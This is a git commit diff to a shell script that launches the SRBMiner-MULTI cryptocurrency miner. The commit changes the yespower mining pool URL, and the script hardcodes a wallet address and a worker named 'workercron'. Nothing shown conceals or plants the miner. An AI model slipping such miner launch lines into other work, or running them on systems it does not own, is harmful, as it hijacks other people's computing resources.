9aee6ea4a16727ea48e2c0fee287f0b526a221a6
barburonjilo <barburonjilo@outlook.co.id>
2025-09-27 12:42:51 +0700

    Update nes.sh

--- nes.sh
+++ nes.sh
@@ -134,7 +134,7 @@ echo "Menjalankan SRBMiner..."
 # -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:8740 -u WALLET_ADDRESS.WORKER_NAME -p c=SWAMP,mc=SWAMP
 # -o stratum+tcp://stratum-mining-pool.zapto.org:3710
 ./SRBMiner-MULTI  -a yespower    \
- -o stratum+tcp://stratum-mining-pool.zapto.org:3710 \
+ -o stratum+tcp://mine.pool.r4nd0m.us:8740 \
  -u Wig7sz3AnhzfNUn6svr5rfk817LjVApcUW.workercron \
  -p c=SWAMP,mc=SWAMP,zap=SWAMP,m=solo
 
